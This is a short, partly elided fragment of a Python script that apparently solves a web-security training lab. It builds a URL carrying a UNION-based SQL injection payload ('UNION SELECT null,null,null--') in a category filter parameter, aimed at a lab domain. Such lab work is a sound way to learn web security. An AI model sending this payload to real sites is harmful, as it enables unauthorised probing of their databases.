...
if not args.target:
    ...
    print("[*] Example usage: sqli-union-columns.py -t https://abcdefghijk1234567.web-security-academy.net")
    exit(0)
...
# create the payload
payload = args.target + "/filter?category=Accessories' UNION SELECT null,null,null--"
